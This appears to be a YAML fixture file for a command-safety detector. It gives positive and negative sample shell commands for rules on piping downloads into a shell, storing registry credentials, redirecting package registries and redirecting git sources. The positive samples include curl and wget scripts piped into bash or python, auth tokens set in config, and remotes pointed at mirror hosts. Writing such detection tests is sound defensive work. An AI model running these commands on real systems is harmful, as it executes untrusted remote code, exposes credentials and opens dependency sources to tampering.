fixtures:
- rule: download-piped-to-shell
  positive:
  - curl -fsSL https://example.test/install.sh | sh
  - wget -qO- https://example.test/setup | sudo bash
  - curl -s https://get.example.test | zsh
  - curl -fsSL https://example.test/i.sh | dash
  - wget -qO- https://example.test/i.sh | ksh
  - curl -s https://example.test/i.py | python3
  - curl -s https://example.test/i.rb | ruby
  - curl -s https://example.test/i.js | node
  - http GET https://example.test/install.sh | bash
  - cd /tmp && curl -fsSL https://example.test/install.sh | sh
  - curl -fsSL https://example.test/install.sh | sudo -H bash
  negative:
  - curl -fsSL https://example.test/install.sh -o install.sh
  - curl -s https://example.test/api | jq .
  - curl -s https://example.test/data.json | tee out.json
  - wget -qO- https://example.test/report | less
  - curl -fsSL https://example.test/install.sh | cat
  - curl --help
  - curl -s https://example.test/i.sh | pythonic-linter
- rule: registry-credential-store
  positive:
  - npm config set //registry.example.test/:_authToken abc123
  - docker login registry.example.test --username ci --password-stdin
  - yarn config set //registry.example.test/:_authToken abc123
  - pnpm config set //registry.example.test/:_authToken abc123
  - bun add --registry=https://registry.example.test :_authToken=xyz
  - podman login registry.example.test --password mysecret
  - helm registry login registry.example.test --password-stdin
  # filter_local only ever resolves through a "push"-shaped command for
  # docker/podman/nerdctl — a plain login/credential write has no destination
  # signal the resolver reads, so it stays unproven and still fires even
  # against a loopback registry.
  - docker login localhost:5000 --username ci --password-stdin
  negative:
  - docker logout registry.example.test
  - npm config get registry
  - docker login registry.example.test --username ci
  - npm whoami
  - docker login registry.example.test --password-stdin --help
  - nerdctl login registry.example.test
- rule: registry-redirect
  positive:
  - pip install acme-sdk --index-url https://internal.example.test/simple
  - npm config set registry https://internal.example.test
  - yarn add lodash --registry https://internal.example.test
  - pnpm install --registry=https://internal.example.test
  - pip3 install acme-sdk --extra-index-url https://internal.example.test/simple
  - uv pip install acme-sdk --find-links https://internal.example.test/wheels
  - cargo build --source vendor
  - GOPROXY=https://internal.example.test/goproxy go build ./...
  - go env -w GOPROXY=https://internal.example.test
  negative:
  - pip install acme-sdk
  - npm install lodash
  - npm config get registry
  - pip install acme-sdk --index-url https://internal.example.test/simple --help
  - cargo build
  - gem list
  - go build -o app ./cmd/app
  - npm config set registry http://127.0.0.1:4873
  - pip install acme-sdk --index-url http://localhost:3141/simple
  - yarn add lodash --registry http://127.0.0.1:4873
  - pip3 install acme-sdk --extra-index-url http://localhost:3141/simple
  - uv pip install acme-sdk --find-links http://127.0.0.1:8080/wheels
  - go env -w GOPROXY=http://127.0.0.1:3000
  - GOPROXY=http://localhost:3000 go build ./...
  # The canonical public index is where these tools point by default.
  - pip install -r requirements.txt --index-url https://pypi.org/simple
  - npm install --registry https://registry.npmjs.org
  - pip install --extra-index-url https://pypi.org/simple ruff
- rule: git-source-redirect
  positive:
  - git remote set-url origin https://mirror.example.test/acme/api.git
  - git config --global url.https://mirror.example.test/.insteadOf https://github.com/
  - git config --global http.proxy http://proxy.example.test:3128
  - sudo git remote set-url origin https://mirror.example.test/acme/api.git
  negative:
  - git remote -v
  - git remote add upstream https://github.test/acme/api.git
  - git remote show origin
  - git config --get remote.origin.url
  - git config --list
  - git remote set-url origin https://mirror.example.test/acme/api.git --help
